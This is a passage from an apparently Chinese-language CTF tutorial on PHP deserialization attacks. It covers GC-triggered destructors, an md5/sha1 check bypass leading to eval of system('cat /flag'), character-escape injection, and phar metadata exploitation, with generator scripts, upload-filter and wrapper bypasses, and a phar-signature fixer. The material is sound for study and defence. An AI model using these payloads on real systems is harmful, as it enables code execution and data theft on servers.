Exception</p></li><li><p>GC</p><p><code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:&#123;&#125;i:0;N;&#125;</code></p><p>因为<strong>反序列化的过程是顺序执行</strong>的，所以到第一个属性时，会将<code>Array[0]</code>设置为<code>getflag</code>对象，同时我们又将<code>Array[0]</code>设置为<code>null</code>，这样前面的<code>getflag</code>对象便丢失了引用，就会被GC所捕获，便可以执行<code>__destruct</code>。</p></li></ul><h5 id="绕过-md5-sha1-验证"><a href="#绕过-md5-sha1-验证" class="headerlink" title="绕过 md5+sha1 验证"></a>绕过 md5+sha1 验证</h5><p>判断条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;var1 != <span class="variable language_">$this</span>-&gt;var2) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var1) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var2)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;var1) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;var2)) ) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入2个不相等对象，但是他们的 <code>__toString</code> 魔法函数返回的一样，可以绕过 if，且eval转为字符串时我们也使其可以被执行。</p><p>查找带 <code>__toString</code> 的类，满足的有 <code>Exception/ErrorException/Error/ParseError/mysqli_sql_exception</code> 等，以 <code>Exception</code> 为例，construct函数为：</p><p><code>public function __construct($message = &quot;&quot;, $code = 0, Throwable $previous = null)</code></p><p>它返回的是一个字符串类型的异常信息，可以控制传入 <code>message</code> 和 <code>code</code> 的值不同即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> =<span class="string">&#x27;system(&quot;cat /flag&quot;);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$ex1</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$ex2</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h5 id="unserialize-callback-func-spl-autoload"><a href="#unserialize-callback-func-spl-autoload" class="headerlink" title="unserialize_callback_func + spl_autoload"></a>unserialize_callback_func + spl_autoload</h5><p>在 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/var.configuration.php#ini.unserialize-callback-func">php manual</a> 里面有一个很有趣的变量配置，如果在反序列化的时候需要实例化一个未定义的类，可以设置回调函数以供调用，最关键的是这个配置是 PHP_IN_ALL 的，所以可以直接通过 ini_set 来设置。</p><blockquote><p><strong>注意</strong>: <strong>unserialize_callback_func 指令</strong></p><p>如果在反序列化的时候需要实例化一个未定义类，则可以设置回调函数以供调用（以免得到的是不完整的 object “__PHP_Incomplete_Class”）。可通过 php.ini、<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ini-set.php">ini_set()</a> 或 .htaccess 定义‘unserialize_callback_func’。每次实例化一个未定义类时它都会被调用。若要禁止这个特性，只需置空此设定。</p></blockquote><p>可以通过 <strong>spl_autoload</strong> 来自动加载未定义的类 settings，会默认加载当前目录下，以settings类名为文件名，php 或者 inc 为后缀的文件，这样就和 settings.inc 联系到了一起。</p><blockquote><p><strong>spl_autoload</strong> — __autoload()函数的默认实现</p><p>spl_autoload ( string <code>$class_name</code> , string <code>$file_extensions</code> = ? ) : void</p><p>file_extensions: 在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc 或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。</p></blockquote><p>​</p><h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的。</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;peri0d&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br></pre></td></tr></table></figure><ol><li><p>正常情况下的序列化结果为 <code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code>。</p></li><li><p>那如果把 <code>username</code> 换成 <code>peri0dxxx</code> ，其处理后的序列化结果为</p><p><code>a:2:&#123;i:0;s:9:&quot;peri0dyyyyyy&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code> ，</p><p>这个时候肯定会反序列化失败，可以看到 <code>s:9:&quot;peri0dyyyyyy&quot;</code> 比以前多了 3 个字符。</p></li><li><p>回到前面， <code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code></p><p>它在进行修改密码之后就变为</p><p><code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;&#125;</code>。</p></li><li><p>可以看到需要添加的字符串 <code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code> 长度为 <code>20</code>。</p></li><li><p>假设要在 <code>peri0d</code> 后面填充 <code>4</code> 个字符，那么就是</p><p><code>s:30:&#39;peri0dxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;;</code></p><p>在经过处理之后就是</p><p><code>s:30:&#39;peri0dyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;;</code></p><p>读取 <code>30</code> 个字符为 <code>peri0dyyyyyyyy&quot;;i:1;s:6:&quot;12345</code>。</p></li><li><p>这就需要继续增加填充字符，在有 <code>20</code> 个 <code>x</code> 时，就实现了密码的修改。</p><p>$6+x+20=6+2x \Rightarrow x=20$</p><p><img src="/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20191112223227-402c9c0c-0559-1.png" alt="20191112223227-402c9c0c-0559-1"></p></li><li><p>可以看到，这和 <code>username</code> 前面的 <code>peri0d</code> 是<strong>毫无关系</strong>的，<strong>只和做替换的字符串有关</strong>。</p></li></ol><p>​</p><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>phar文件本质上是一种压缩文件，在使用phar协议文件包含时，也是可以直接读取zip文件的。使用phar://协议读取文件时，文件会被解析成phar对象，phar对象内的以序列化形式存储的用户自定义元数据（metadata）信息会被反序列化。这就引出了我们攻击手法最核心的流程。</p><p>流程：构造phar（元数据中含有恶意序列化内容）文件—&gt;上传—&gt;触发反序列化</p><p>最后一步是寻找触发phar文件元数据反序列化。其实php中有一大部分的文件系统函数在通过phar://伪协议解析phar文件时都会将meta-data进行反序列化。</p><p><strong>利用条件</strong></p><ul><li><p>phar文件要能够上传到服务器端。能触发的文件操作函数：</p><p>include、file_get_contents、file_put_contents、copy、file、file_exists、is_executable、is_file、is_dir、is_link、is_writable、fileperms、fileinode、filesize、fileowner、filegroup、fileatime、filemtime、filectime、filetype、getimagesize、exif_read_data、stat、lstat、touch、md5_file</p></li><li><p>要有可用的魔术方法作为“跳板”。</p></li><li><p>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</p></li></ul><p><strong>生成phar文件</strong></p><p>首先得生成一个含有序列化metadata的phar文件。php提供一个类允许我们处理phar文件相关操作。注意要设置php.ini中<strong>phar.readonly=Off</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    Public <span class="variable">$name</span>；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar，生成后可以随意修改</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;name = <span class="string">&#x27;JrXnm&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>tar包装：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    Public <span class="variable">$name</span>；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;name = <span class="string">&#x27;JrXnm&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.tar&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -r .phar&#x27;</span>);</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="string">&#x27;mkdir .phar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.phar/.metadata&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>));</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;tar -cf phar.tar .phar/*&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// phar://./phar.tar</span></span><br><span class="line"><span class="comment">// phar:///var/www/html/uploads/phar.tar</span></span><br></pre></td></tr></table></figure><p>zip包装：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    Public <span class="variable">$name</span>；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;name = <span class="string">&#x27;JrXnm&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;phar.zip&#x27;</span>)) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.zip&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;phar.zip&#x27;</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// phar://./phar.zip</span></span><br><span class="line"><span class="comment">// phar:///var/www/html/uploads/phar.zip</span></span><br></pre></td></tr></table></figure><p><strong>上传到服务器</strong></p><p>phar文件是很容易绕过上传限制的，首先它的后缀是不限制的，改成什么phar://协议都可以解析。</p><p>前面这个标志的格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code> 前面内容不限，这样可以在前面添加注入<code>GIF98a</code>这样的文件头绕过上传限制。</p><p><strong>反序列化执行</strong></p><p>直接执行测试的那份代码，phar://协议在file_get_contents函数中解析phar文件，将元数据反序列化执行魔法函数。</p><p><strong>绕过</strong></p><ul><li><p><strong>phar://不能出现在首部</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://phar://</span><br><span class="line">compress.bzip2://phar://</span><br><span class="line">php://filter/resource=phar://</span><br></pre></td></tr></table></figure></li><li><p><strong>关键字</strong></p><p>绕过如 <code>HALT_COMPILER</code>，使用 <code>gzip</code> 命令处理phar文件：</p><p><code>gzip phar.jpg</code></p><p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240007#h2-5">从一道题再看phar的利用</a></p></li><li><p><strong>修改phar文件</strong></p><p>改phar文件内容，因phar文件是有检验和的，所以直接改phar文件内容不可行。</p><p>参考：<a target="_blank" rel="noopener" href="https://morblog.cc/posts/2586386993/">总结 - ctf中php的phar(一)</a></p><p>修复签名数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./ph1.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># 修改内容后的phar文件</span></span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">newf = s+sha1(s).digest()+h <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;ph2.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure><p>构造phar结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha1, sha256, sha512</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PHAR</span>:</span><br><span class="line">    <span class="comment"># 一些常量</span></span><br><span class="line">    STUB = <span class="string">b&quot;__HALT_COMPILER(); ?&gt;&quot;</span></span><br><span class="line">    GBMB = <span class="string">b&quot;GBMB&quot;</span></span><br><span class="line">    MD5 = <span class="string">b&quot;\x01\x00\x00\x00&quot;</span></span><br><span class="line">    SHA1 = <span class="string">b&quot;\x02\x00\x00\x00&quot;</span></span><br><span class="line">    SHA256 = <span class="string">b&quot;\x03\x00\x00\x00&quot;</span></span><br><span class="line">    SHA512 = <span class="string">b&quot;\x04\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                 prefix: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 manifestData: <span class="built_in">dict</span>,</span></span><br><span class="line"><span class="params">                 filesData: <span class="built_in">list</span>,</span></span><br><span class="line"><span class="params">                 signatureType: MD5</span></span><br><span class="line"><span class="params">                 </span>):</span><br><span class="line">        self.prefix = prefix.encode()</span><br><span class="line">        self.manifestData = manifestData</span><br><span class="line">        self.filesData = filesData</span><br><span class="line">        self.signatureType = signatureType</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查清单的参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(self.manifestData.get(each) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> each <span class="keyword">in</span> [<span class="string">&quot;loc&quot;</span>, <span class="string">&quot;metaData&quot;</span>]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 至少要归档一个文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.filesData) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 遍历检查文件的参数</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.get(each) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> each <span class="keyword">in</span> [<span class="string">&quot;fileName&quot;</span>, <span class="string">&quot;fileContent&quot;</span>, <span class="string">&quot;loc&quot;</span>, <span class="string">&quot;metaData&quot;</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将字符串转换字节流</span></span><br><span class="line">        self.manifestData[<span class="string">&quot;metaData&quot;</span>] = self.manifestData[<span class="string">&quot;metaData&quot;</span>].encode()</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> file.items():</span><br><span class="line">                <span class="keyword">if</span> key <span class="keyword">in</span> [<span class="string">&quot;fileName&quot;</span>, <span class="string">&quot;fileContent&quot;</span>, <span class="string">&quot;metaData&quot;</span>]:</span><br><span class="line">                    file[key] = value.encode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.parse():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        phar = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="comment"># stub</span></span><br><span class="line">        stub = self.stub()</span><br><span class="line">        <span class="comment"># manifest</span></span><br><span class="line">        manifest = self.manifest()</span><br><span class="line">        files = self.file()</span><br><span class="line">        <span class="comment"># content</span></span><br><span class="line">        contents = self.content()</span><br><span class="line">        <span class="comment"># 计算总长度</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(manifest + files + contents)) + manifest[<span class="number">4</span>:]</span><br><span class="line">        <span class="comment"># signature</span></span><br><span class="line">        signature = self.signature(stub + manifest + files + contents)</span><br><span class="line">        <span class="comment"># 重新拼接</span></span><br><span class="line">        phar += stub + manifest + files + contents + signature</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> phar</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stub</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.prefix + self.STUB + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">manifest</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 归档文件数量</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(self.filesData))</span><br><span class="line">        <span class="comment"># 版本</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x11\x00&quot;</span></span><br><span class="line">        <span class="comment"># 标识</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x00\x00\x01\x00&quot;</span></span><br><span class="line">        <span class="comment"># 别名长度</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果将序列化内容存储于此</span></span><br><span class="line">        <span class="keyword">if</span> self.manifestData[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">            <span class="comment"># metadata长度</span></span><br><span class="line">            manifest += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(self.manifestData[<span class="string">&quot;metaData&quot;</span>]))</span><br><span class="line">            <span class="comment"># metadata内容</span></span><br><span class="line">            manifest += self.manifestData[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            manifest += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 补足长度</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>) + manifest</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> manifest</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">file</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        files = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历归档的文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="comment"># 文件名长度</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileName&quot;</span>]))</span><br><span class="line">            <span class="comment"># 文件名</span></span><br><span class="line">            files += file[<span class="string">&quot;fileName&quot;</span>]</span><br><span class="line">            <span class="comment"># 未压缩大小</span></span><br><span class="line">            files += 